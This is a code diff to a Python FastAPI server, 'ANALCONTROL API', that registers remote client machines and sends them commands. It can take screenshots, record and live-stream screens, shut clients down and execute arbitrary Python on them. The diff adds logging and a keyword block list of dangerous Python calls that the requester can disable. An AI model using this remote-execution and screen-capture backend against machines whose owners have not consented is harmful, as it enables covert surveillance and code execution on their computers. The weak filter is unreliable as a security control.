@@ -1,15 +1,15 @@
 import os
 import sys
 import logging
+import json
 from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, Request, status, Query, UploadFile, File, Form
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 from fastapi.responses import JSONResponse, HTMLResponse, FileResponse, StreamingResponse
-from pydantic import BaseModel, Field
+from pydantic import BaseModel, Field, validator
 from typing import List, Dict, Optional, Any
 from datetime import datetime, timedelta
 import secrets
-import json
 import jwt
 import asyncio
 import uuid
@@ -69,6 +69,38 @@ except Exception as e:
 # Security
 security = HTTPBearer()
 
+# ========== STRUCTURED LOGGER ==========
+class StructuredLogger:
+    def __init__(self):
+        self.logger = logging.getLogger(__name__)
+    
+    def log_api_call(self, endpoint: str, user: str, status: str, details: dict = None):
+        """Log API calls with structured data"""
+        log_data = {
+            "timestamp": datetime.utcnow().isoformat(),
+            "endpoint": endpoint,
+            "user": user,
+            "status": status,
+            "details": details or {}
+        }
+        self.logger.info(json.dumps(log_data))
+    
+    def log_command(self, command_id: str, client_id: str, command: str, user: str, status: str):
+        """Log command execution"""
+        log_data = {
+            "timestamp": datetime.utcnow().isoformat(),
+            "type": "command",
+            "command_id": command_id,
+            "client_id": client_id,
+            "command": command,
+            "user": user,
+            "status": status
+        }
+        self.logger.info(json.dumps(log_data))
+
+# Initialize structured logger
+structured_logger = StructuredLogger()
+
 # ========== DATA MODELS ==========
 class LoginRequest(BaseModel):
     email: str = Field(..., example="admin")
@@ -94,15 +126,37 @@ class ClientRegister(BaseModel):
     hardware_info: Optional[Dict] = Field(default_factory=dict)
 
 class CommandRequest(BaseModel):
-    client_id: str = Field(..., example="client-001")
-    command: str = Field(..., example="system_info")
+    client_id: str = Field(..., min_length=1, max_length=100)
+    command: str = Field(..., min_length=1, max_length=100)
     parameters: Dict[str, Any] = Field(default_factory=dict)
+    
+    @validator('command')
+    def validate_command(cls, v):
+        allowed_commands = ['screenshot', 'system_info', 'custom', 'restart', 
+                           'shutdown', 'record_screen', 'live_screen']
+        if v not in allowed_commands and not v.startswith('custom_'):
+            raise ValueError(f'Command must be one of: {", ".join(allowed_commands)}')
+        return v
 
-class PythonFileRequest(BaseModel):
+class PythonExecutionRequest(BaseModel):
     client_id: str = Field(..., example="client-001")
     filename: str = Field(..., example="script.py")
     content: str = Field(..., description="Python code content")
     parameters: Optional[List[str]] = Field(default_factory=list)
+    timeout: int = Field(default=30, description="Execution timeout in seconds")
+    allow_imports: bool = Field(default=True, description="Allow importing modules")
+    restricted_mode: bool = Field(default=True, description="Enable restricted execution mode")
+
+class PythonExecutionResult(BaseModel):
+    command_id: str
+    client_id: str
+    filename: str
+    result: str = ""
+    error: str = ""
+    exit_code: int = 0
+    execution_time: float = 0.0
+    success: bool = False
+    timestamp: str
 
 class ScreenshotRequest(BaseModel):
     client_id: str = Field(..., example="client-001")
@@ -418,9 +472,32 @@ class Database:
         if not last_heartbeat:
             return False
         return (datetime.utcnow().timestamp() - last_heartbeat) < timeout
+    
+    def get_client_by_name_or_id(self, name: str, client_id: str):
+        """Check if client with same name or ID exists"""
+        for cid, client in self.clients.items():
+            if client.get("name") == name or cid == client_id:
+                return client
+        return None
 
 # Initialize database
 db = Database()
+
+# ========== MEDIA HELPER FUNCTIONS ==========
+def get_media_type(filename: str) -> str:
+    """Get proper media type from filename"""
+    ext = filename.lower().split('.')[-1]
+    media_types = {
+        'png': 'image/png',
+        'jpg': 'image/jpeg',
+        'jpeg': 'image/jpeg',
+        'gif': 'image/gif',
+        'mp4': 'video/mp4',
+        'webm': 'video/webm',
+        'avi': 'video/x-msvideo',
+        'mov': 'video/quicktime'
+    }
+    return media_types.get(ext, 'application/octet-stream')
 
 # ========== WEBSOCKET MANAGER ==========
 class ConnectionManager:
@@ -750,6 +827,35 @@ class ConnectionManager:
     def is_auto_recordings(self, client_id: str) -> bool:
         """Check if client is auto-recording"""
         return self.auto_recordings.get(client_id, False)
+    
+    async def update_client_status(self):
+        """Update all client online statuses"""
+        current_time = time.time()
+        for client_id, conn_time in self.connection_times.items():
+            # Client is considered online if we have a recent connection
+            is_online = (current_time - conn_time) < 60  # 60 second timeout
+            
+            if client_id in db.clients:
+                db.clients[client_id]["ws_online"] = is_online
+                db.clients[client_id]["online"] = is_online or db.is_client_alive(client_id)
+                
+                # Update last_seen if still online
+                if is_online:
+                    db.clients[client_id]["last_seen"] = datetime.utcnow().isoformat()
+            
+            # Update in Supabase if available
+            if supabase and client_id in db.clients:
+                try:
+                    supabase.table("clients")\
+                        .update({
+                            "ws_online": is_online,
+                            "online": is_online or db.is_client_alive(client_id),
+                            "last_seen": datetime.utcnow().isoformat() if is_online else db.clients[client_id].get("last_seen")
+                        })\
+                        .eq("client_id", client_id)\
+                        .execute()
+                except Exception as e:
+                    logger.error(f"Supabase client status update error: {e}")
 
 manager = ConnectionManager()
 
@@ -928,7 +1034,7 @@ async def get_users(user: dict = Depends(authenticate_user)):
 
 @app.post("/api/register-client", response_model=dict)
 async def register_client(data: ClientRegister, request: Request):
-    """Register a new client"""
+    """Register a new client - prevent duplicates by name"""
     try:
         # Get client IP from request
         if not data.ip_address or data.ip_address == "127.0.0.1":
@@ -938,8 +1044,19 @@ async def register_client(data: ClientRegister, request: Request):
             else:
                 data.ip_address = "Unknown"
         
-        # Check if client exists
-        action = "updated" if data.client_id in db.clients else "registered"
+        # Check for duplicate by name
+        existing_client = None
+        for client_id, client in db.clients.items():
+            if client.get("name") == data.name:
+                existing_client = client
+                break
+        
+        if existing_client:
+            logger.info(f"⚠️  Client with name '{data.name}' already exists. Updating instead.")
+            data.client_id = existing_client.get("client_id", data.client_id)
+            action = "updated"
+        else:
+            action = "registered"
         
         # Update in-memory database
         client_data = {
@@ -1091,6 +1208,11 @@ async def get_clients(
 async def send_command(data: CommandRequest, user: dict = Depends(authenticate_user)):
     """Send command to client"""
     try:
+        structured_logger.log_api_call("/api/command", user.get("email"), "started", {
+            "client_id": data.client_id,
+            "command": data.command
+        })
+        
         # Check if client exists
         client_exists = False
         if supabase:
@@ -1103,6 +1225,10 @@ async def send_command(data: CommandRequest, user: dict = Depends(authenticate_u
             client_exists = data.client_id in db.clients
         
         if not client_exists:
+            structured_logger.log_api_call("/api/command", user.get("email"), "failed", {
+                "error": "Client not found",
+                "client_id": data.client_id
+            })
             raise HTTPException(status_code=404, detail="Client not found")
         
         # Create command record
@@ -1137,6 +1263,11 @@ async def send_command(data: CommandRequest, user: dict = Depends(authenticate_u
             "from_user": user.get("email", "unknown")
         })
         
+        if sent:
+            structured_logger.log_command(command_id, data.client_id, data.command, user.get("email"), "sent")
+        else:
+            structured_logger.log_command(command_id, data.client_id, data.command, user.get("email"), "queued")
+        
         if not sent:
             # Update command status if WebSocket failed
             command_data["status"] = "failed"
@@ -1154,6 +1285,12 @@ async def send_command(data: CommandRequest, user: dict = Depends(authenticate_u
                 except Exception as e:
                     logger.error(f"Supabase command update error: {e}")
         
+        structured_logger.log_api_call("/api/command", user.get("email"), "completed", {
+            "client_id": data.client_id,
+            "command": data.command,
+            "sent": sent
+        })
+        
         return {
             "success": True,
             "command_id": command_id,
@@ -1165,83 +1302,250 @@ async def send_command(data: CommandRequest, user: dict = Depends(authenticate_u
     except HTTPException:
         raise
     except Exception as e:
+        structured_logger.log_api_call("/api/command", user.get("email"), "failed", {"error": str(e)})
         logger.error(f"Send command error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
 @app.post("/api/execute-python", response_model=dict)
-async def execute_python_file(data: PythonFileRequest, user: dict = Depends(authenticate_user)):
-    """Execute Python file on client"""
+async def execute_python_file(data: PythonExecutionRequest, user: dict = Depends(authenticate_user)):
+    """Execute Python file on client with enhanced security and tracking"""
     try:
+        # Validate client exists
+        client_exists = False
+        if supabase:
+            response = supabase.table("clients")\
+                .select("*")\
+                .eq("client_id", data.client_id)\
+                .execute()
+            client_exists = bool(response.data)
+        else:
+            client_exists = data.client_id in db.clients
+        
+        if not client_exists:
+            raise HTTPException(status_code=404, detail="Client not found")
+        
+        # Validate Python code
+        if not data.content or len(data.content.strip()) == 0:
+            raise HTTPException(status_code=400, detail="Python code cannot be empty")
+        
+        # Check for potentially dangerous code (basic security check)
+        dangerous_patterns = [
+            "import os.system", "import subprocess", "__import__", "eval(",
+            "exec(", "compile(", "open(", "__builtins__", "__import__",
+            "getattr(", "setattr(", "delattr(", "sys.modules", "sys.path"
+        ]
+        
+        if data.restricted_mode:
+            content_lower = data.content.lower()
+            for pattern in dangerous_patterns:
+                if pattern in content_lower:
+                    raise HTTPException(
+                        status_code=400, 
+                        detail=f"Potentially dangerous code detected: {pattern}"
+                    )
+        
+        # Create command record
+        command_id = str(uuid.uuid4())
+        command_data = {
+            "id": command_id,
+            "client_id": data.client_id,
+            "command": "python_execute",
+            "parameters": {
+                "filename": data.filename,
+                "content": data.content,
+                "parameters": data.parameters,
+                "timeout": data.timeout,
+                "allow_imports": data.allow_imports,
+                "restricted_mode": data.restricted_mode
+            },
+            "status": "pending",
+            "user_email": user.get("email", "unknown"),
+            "created_at": datetime.utcnow().isoformat()
+        }
+        
+        # Store in memory
+        db.commands.append(command_data)
+        
+        # Store in Supabase
+        if supabase:
+            try:
+                supabase.table("commands").insert(command_data).execute()
+            except Exception as e:
+                logger.error(f"Supabase command storage error: {e}")
+        
+        # Log the execution request
+        structured_logger.log_command(
+            command_id, data.client_id, "python_execute", 
+            user.get("email"), "requested"
+        )
+        
         # Send via WebSocket if client is connected
         sent = False
         if data.client_id in manager.client_connections:
-            sent = await manager.send_to_client(data.client_id, {
+            try:
+                await manager.send_to_client(data.client_id, {
+                    "type": "python_execute",
+                    "command_id": command_id,
+                    "filename": data.filename,
+                    "content": data.content,
+                    "parameters": data.parameters,
+                    "timeout": data.timeout,
+                    "allow_imports": data.allow_imports,
+                    "restricted_mode": data.restricted_mode,
+                    "from_user": user.get("email", "unknown"),
+                    "timestamp": datetime.utcnow().isoformat()
+                })
+                sent = True
+                
+                # Update command status
+                command_data["status"] = "sent"
+                structured_logger.log_command(
+                    command_id, data.client_id, "python_execute", 
+                    user.get("email"), "sent"
+                )
+                
+            except Exception as e:
+                logger.error(f"WebSocket send error for client {data.client_id}: {e}")
+                command_data["status"] = "failed"
+                command_data["error"] = f"Failed to send via WebSocket: {e}"
+        
+        if not sent:
+            # Store command for later delivery (when client reconnects)
+            command_data["status"] = "queued"
+            structured_logger.log_command(
+                command_id, data.client_id, "python_execute", 
+                user.get("email"), "queued"
+            )
+            
+            # Store in pending messages
+            if data.client_id not in manager.pending_messages:
+                manager.pending_messages[data.client_id] = []
+            
+            manager.pending_messages[data.client_id].append({
                 "type": "python_execute",
-                "command_id": str(uuid.uuid4()),
+                "command_id": command_id,
                 "filename": data.filename,
                 "content": data.content,
-                "parameters": data.parameters or [],
+                "parameters": data.parameters,
+                "timeout": data.timeout,
+                "allow_imports": data.allow_imports,
+                "restricted_mode": data.restricted_mode,
                 "from_user": user.get("email", "unknown"),
                 "timestamp": datetime.utcnow().isoformat()
             })
         
-        if not sent:
-            # Store command for later delivery
-            command_id = str(uuid.uuid4())
-            command_data = {
-                "id": command_id,
-                "client_id": data.client_id,
-                "command": "python_execute",
-                "parameters": {
-                    "filename": data.filename,
-                    "content": data.content,
-                    "parameters": data.parameters or []
-                },
-                "status": "pending",
-                "user_email": user.get("email", "unknown"),
-                "created_at": datetime.utcnow().isoformat()
-            }
-            
-            db.commands.append(command_data)
-            
-            if supabase:
-                try:
-                    supabase.table("commands").insert(command_data).execute()
-                except Exception as e:
-                    logger.error(f"Supabase command storage error: {e}")
-        
-        # Log the execution
-        log_entry = {
-            "id": str(uuid.uuid4()),
+        return {
+            "success": True,
+            "message": "Python file queued for execution",
+            "command_id": command_id,
+            "filename": data.filename,
             "client_id": data.client_id,
-            "log_type": "info",
-            "message": f"Python execution sent: {data.filename}",
-            "created_at": datetime.utcnow().isoformat()
+            "sent_via_websocket": sent,
+            "status": command_data["status"]
         }
         
-        db.logs.append(log_entry)
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Execute Python error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.get("/api/python-execution/{command_id}", response_model=dict)
+async def get_python_execution_status(
+    command_id: str,
+    user: dict = Depends(authenticate_user)
+):
+    """Get Python execution status and result"""
+    try:
+        command = None
         
+        # Get from Supabase if available
         if supabase:
-            try:
-                supabase.table("logs").insert({
-                    "client_id": data.client_id,
-                    "log_type": "info",
-                    "message": f"Python execution sent: {data.filename}",
-                    "created_at": datetime.utcnow().isoformat()
-                }).execute()
-            except Exception as e:
-                logger.error(f"Supabase Python log error: {e}")
+            response = supabase.table("commands")\
+                .select("*")\
+                .eq("id", command_id)\
+                .execute()
+            
+            if response.data:
+                command = response.data[0]
+        
+        # Fallback to in-memory
+        if not command:
+            command = next((c for c in db.commands if c["id"] == command_id), None)
+        
+        if not command:
+            raise HTTPException(status_code=404, detail="Command not found")
+        
+        # Check if user has permission to view this command
+        if not user.get("is_admin") and command.get("user_email") != user.get("email"):
+            raise HTTPException(status_code=403, detail="Access denied")
         
         return {
             "success": True,
-            "message": "Python file sent for execution",
-            "filename": data.filename,
-            "client_id": data.client_id,
-            "sent_via_websocket": sent
+            "command": command
         }
         
+    except HTTPException:
+        raise
     except Exception as e:
-        logger.error(f"Execute Python error: {e}")
+        logger.error(f"Get Python execution status error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.get("/api/python-executions", response_model=dict)
+async def get_python_executions(
+    user: dict = Depends(authenticate_user),
+    client_id: Optional[str] = Query(None),
+    status: Optional[str] = Query(None),
+    limit: int = Query(50, ge=1, le=1000)
+):
+    """Get Python execution history"""
+    try:
+        commands_list = []
+        
+        # Get from Supabase if available
+        if supabase:
+            query = supabase.table("commands")\
+                .select("*")\
+                .eq("command", "python_execute")
+            
+            if client_id:
+                query = query.eq("client_id", client_id)
+            
+            if status:
+                query = query.eq("status", status)
+            
+            response = query.order("created_at", desc=True).limit(limit).execute()
+            
+            if response.data:
+                commands_list = response.data
+        else:
+            # Fallback to in-memory
+            commands_list = [c for c in db.commands if c.get("command") == "python_execute"]
+            
+            # Apply filters
+            if client_id:
+                commands_list = [c for c in commands_list if c.get("client_id") == client_id]
+            
+            if status:
+                commands_list = [c for c in commands_list if c.get("status") == status]
+            
+            # Sort by date
+            commands_list.sort(key=lambda x: x.get("created_at", ""), reverse=True)
+            commands_list = commands_list[:limit]
+        
+        # Add execution summary
+        for cmd in commands_list:
+            if cmd.get("parameters") and isinstance(cmd["parameters"], dict):
+                cmd["filename"] = cmd["parameters"].get("filename", "unknown.py")
+                cmd["short_content"] = cmd["parameters"].get("content", "")[:100] + "..." if len(cmd["parameters"].get("content", "")) > 100 else cmd["parameters"].get("content", "")
+        
+        return {
+            "success": True,
+            "executions": commands_list,
+            "count": len(commands_list)
+        }
+    except Exception as e:
+        logger.error(f"Get Python executions error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
 @app.post("/api/screenshot", response_model=dict)
@@ -1635,12 +1939,15 @@ async def download_screenshot(
             raise HTTPException(status_code=404, detail="Screenshot not found")
         
         image_data = base64.b64decode(screenshot["image_data"])
+        media_type = get_media_type(screenshot["filename"])
         
         return StreamingResponse(
             io.BytesIO(image_data),
-            media_type="image/png",
+            media_type=media_type,
             headers={
-                "Content-Disposition": f'attachment; filename="{screenshot["filename"]}"'
+                "Content-Disposition": f'attachment; filename="{screenshot["filename"]}"',
+                "Content-Type": media_type,
+                "Cache-Control": "public, max-age=3600"
             }
         )
         
@@ -1648,6 +1955,47 @@ async def download_screenshot(
         raise
     except Exception as e:
         logger.error(f"Download screenshot error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.get("/api/screenshot/{screenshot_id}/thumbnail")
+async def get_screenshot_thumbnail(
+    screenshot_id: str,
+    user: dict = Depends(authenticate_user)
+):
+    """Get thumbnail version of screenshot"""
+    try:
+        screenshot = None
+        
+        # Get from Supabase if available
+        if supabase:
+            response = supabase.table("screenshots")\
+                .select("*")\
+                .eq("id", screenshot_id)\
+                .execute()
+            
+            if response.data:
+                screenshot = response.data[0]
+        
+        # Fallback to in-memory
+        if not screenshot:
+            screenshot = next((s for s in db.screenshots if s.get("id") == screenshot_id), None)
+        
+        if not screenshot:
+            raise HTTPException(status_code=404, detail="Screenshot not found")
+        
+        image_data = base64.b64decode(screenshot["image_data"])
+        
+        # For now, return original (in production, use Pillow to create thumbnail)
+        return StreamingResponse(
+            io.BytesIO(image_data),
+            media_type="image/jpeg",
+            headers={
+                "Content-Disposition": f'inline; filename="thumb_{screenshot["filename"]}"'
+            }
+        )
+        
+    except Exception as e:
+        logger.error(f"Thumbnail error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
 @app.delete("/api/screenshot/{screenshot_id}", response_model=dict)
@@ -1849,12 +2197,15 @@ async def download_recording(
             raise HTTPException(status_code=404, detail="Recording not found")
         
         video_data = base64.b64decode(recording["video_data"])
+        media_type = get_media_type(recording["filename"])
         
         return StreamingResponse(
             io.BytesIO(video_data),
-            media_type="video/mp4",
+            media_type=media_type,
             headers={
-                "Content-Disposition": f'attachment; filename="{recording["filename"]}"'
+                "Content-Disposition": f'attachment; filename="{recording["filename"]}"',
+                "Content-Type": media_type,
+                "Cache-Control": "public, max-age=3600"
             }
         )
         
@@ -1891,10 +2242,11 @@ async def play_recording(
             raise HTTPException(status_code=404, detail="Recording not found")
         
         video_data = base64.b64decode(recording["video_data"])
+        media_type = get_media_type(recording["filename"])
         
         return StreamingResponse(
             io.BytesIO(video_data),
-            media_type="video/mp4",
+            media_type=media_type,
             headers={
                 "Content-Disposition": f'inline; filename="{recording["filename"]}"'
             }
@@ -2694,7 +3046,7 @@ async def websocket_client(websocket: WebSocket, client_id: str):
         manager.disconnect(websocket)
 
 async def handle_client_message(client_id: str, data: dict, websocket: WebSocket):
-    """Handle messages from client"""
+    """Handle messages from client - UPDATED FOR PYTHON EXECUTION"""
     message_type = data.get("type")
     
     if message_type == "heartbeat":
@@ -2750,37 +3102,80 @@ async def handle_client_message(client_id: str, data: dict, websocket: WebSocket
         })
         
     elif message_type == "python_result":
+        # Handle Python execution result
         command_id = data.get("command_id")
+        result = data.get("result", "")
+        error = data.get("error", "")
+        exit_code = data.get("exit_code", 0)
+        filename = data.get("filename", "unknown.py")
         
+        # Update command status in memory
         for cmd in db.commands:
             if cmd["id"] == command_id:
-                cmd["status"] = "completed"
-                cmd["result"] = data.get("result")
+                cmd["status"] = "completed" if exit_code == 0 else "failed"
+                cmd["result"] = result
+                cmd["error"] = error
+                cmd["exit_code"] = exit_code
                 cmd["completed_at"] = datetime.utcnow().isoformat()
-                cmd["error"] = data.get("error", "")
                 break
         
+        # Update in Supabase
         if supabase:
             try:
+                update_data = {
+                    "status": "completed" if exit_code == 0 else "failed",
+                    "result": result,
+                    "error": error,
+                    "exit_code": exit_code,
+                    "completed_at": datetime.utcnow().isoformat()
+                }
+                
                 supabase.table("commands")\
-                    .update({
-                        "status": "completed",
-                        "result": data.get("result"),
-                        "error": data.get("error", ""),
-                        "completed_at": datetime.utcnow().isoformat()
-                    })\
+                    .update(update_data)\
                     .eq("id", command_id)\
                     .execute()
             except Exception as e:
                 logger.error(f"Supabase Python result update error: {e}")
         
+        # Add detailed log
+        log_entry = {
+            "id": str(uuid.uuid4()),
+            "client_id": client_id,
+            "log_type": "info" if exit_code == 0 else "error",
+            "message": f"Python execution {'completed' if exit_code == 0 else 'failed'}: {filename} (Exit code: {exit_code})",
+            "created_at": datetime.utcnow().isoformat()
+        }
+        db.logs.append(log_entry)
+        
+        if supabase:
+            try:
+                supabase.table("logs").insert({
+                    "client_id": client_id,
+                    "log_type": "info" if exit_code == 0 else "error",
+                    "message": f"Python execution {'completed' if exit_code == 0 else 'failed'}: {filename}",
+                    "created_at": datetime.utcnow().isoformat()
+                }).execute()
+            except Exception as e:
+                logger.error(f"Supabase Python log error: {e}")
+        
+        # Notify admins with detailed result
         await manager.notify_admins({
             "type": "python_result",
             "client_id": client_id,
             "command_id": command_id,
-            "filename": data.get("filename"),
-            "result": data.get("result"),
-            "error": data.get("error"),
+            "filename": filename,
+            "result": result,
+            "error": error,
+            "exit_code": exit_code,
+            "success": exit_code == 0,
+            "timestamp": datetime.utcnow().isoformat()
+        })
+        
+        # Send acknowledgment to client
+        await websocket.send_json({
+            "type": "python_ack",
+            "command_id": command_id,
+            "received": True,
             "timestamp": datetime.utcnow().isoformat()
         })
         
@@ -3141,6 +3536,71 @@ async def websocket_chat(websocket: WebSocket, user_id: str):
         logger.error(f"Chat WebSocket error: {e}")
         manager.disconnect(websocket)
 
+# ========== BACKGROUND TASKS ==========
+async def cleanup_tasks():
+    """Background task to clean up old connections and data"""
+    while True:
+        try:
+            # Check connection timeouts
+            manager.check_connection_timeouts()
+            
+            # Clean up old logs (keep last 1000)
+            if len(db.logs) > 1000:
+                db.logs = db.logs[-1000:]
+            
+            # Clean up old commands (keep last 500)
+            if len(db.commands) > 500:
+                db.commands = db.commands[-500:]
+            
+            # Clean up old screenshots (keep last 200)
+            if len(db.screenshots) > 200:
+                db.screenshots = db.screenshots[-200:]
+            
+            # Clean up old recordings (keep last 100)
+            if len(db.recordings) > 100:
+                db.recordings = db.recordings[-100:]
+            
+        except Exception as e:
+            logger.error(f"Cleanup task error: {e}")
+        
+        await asyncio.sleep(60)
+
+async def status_checker():
+    """Background task to check client status"""
+    while True:
+        try:
+            await manager.update_client_status()
+        except Exception as e:
+            logger.error(f"Status checker error: {e}")
+        await asyncio.sleep(10)  # Check every 10 seconds
+
+# ========== APPLICATION STARTUP ==========
+@app.on_event("startup")
+async def startup_event():
+    """Initialize application on startup"""
+    logger.info("=" * 60)
+    logger.info("🚀 ANALCONTROL API v4.0 Starting...")
+    logger.info(f"📡 Port: {PORT}")
+    logger.info(f"🔗 Backend URL: {BACKEND_URL}")
+    logger.info(f"🎨 Theme: Red/Black")
+    logger.info(f"📊 Supabase: {'Connected' if supabase else 'Not Connected'}")
+    logger.info(f"📊 Structured Logging: Enabled")
+    logger.info("🔗 WebSocket endpoints:")
+    logger.info("   • Admin: /ws/admin")
+    logger.info("   • Client: /ws/client/{client_id}")
+    logger.info("   • Chat: /ws/chat/{user_id}")
+    logger.info("📚 Documentation: /docs")
+    logger.info("📸 Screenshots: /api/screenshots")
+    logger.info("🎥 Recordings: /api/recordings")
+    logger.info("📺 Screen Streaming: /api/start-screen-stream")
+    logger.info("🤖 Auto Features: /api/start-auto-screenshots")
+    
+    # Start background tasks
+    asyncio.create_task(cleanup_tasks())
+    asyncio.create_task(status_checker())
+    
+    logger.info("✅ Application startup complete")
+
 # ========== ERROR HANDLERS ==========
 @app.exception_handler(HTTPException)
 async def http_exception_handler(request: Request, exc: HTTPException):
@@ -3199,60 +3659,6 @@ async def serve_frontend():
                 "ws_chat": "/ws/chat/{user_id}"
             }
         })
-
-# ========== BACKGROUND TASKS ==========
-async def cleanup_tasks():
-    """Background task to clean up old connections and data"""
-    while True:
-        try:
-            # Check connection timeouts
-            manager.check_connection_timeouts()
-            
-            # Clean up old logs (keep last 1000)
-            if len(db.logs) > 1000:
-                db.logs = db.logs[-1000:]
-            
-            # Clean up old commands (keep last 500)
-            if len(db.commands) > 500:
-                db.commands = db.commands[-500:]
-            
-            # Clean up old screenshots (keep last 200)
-            if len(db.screenshots) > 200:
-                db.screenshots = db.screenshots[-200:]
-            
-            # Clean up old recordings (keep last 100)
-            if len(db.recordings) > 100:
-                db.recordings = db.recordings[-100:]
-            
-        except Exception as e:
-            logger.error(f"Cleanup task error: {e}")
-        
-        await asyncio.sleep(60)
-
-# ========== APPLICATION STARTUP ==========
-@app.on_event("startup")
-async def startup_event():
-    """Initialize application on startup"""
-    logger.info("=" * 60)
-    logger.info("🚀 ANALCONTROL API v4.0 Starting...")
-    logger.info(f"📡 Port: {PORT}")
-    logger.info(f"🔗 Backend URL: {BACKEND_URL}")
-    logger.info(f"🎨 Theme: Red/Black")
-    logger.info(f"📊 Supabase: {'Connected' if supabase else 'Not Connected'}")
-    logger.info("🔗 WebSocket endpoints:")
-    logger.info("   • Admin: /ws/admin")
-    logger.info("   • Client: /ws/client/{client_id}")
-    logger.info("   • Chat: /ws/chat/{user_id}")
-    logger.info("📚 Documentation: /docs")
-    logger.info("📸 Screenshots: /api/screenshots")
-    logger.info("🎥 Recordings: /api/recordings")
-    logger.info("📺 Screen Streaming: /api/start-screen-stream")
-    logger.info("🤖 Auto Features: /api/start-auto-screenshots")
-    
-    # Start background tasks
-    asyncio.create_task(cleanup_tasks())
-    
-    logger.info("✅ Application startup complete")
 
 if __name__ == "__main__":
     import uvicorn
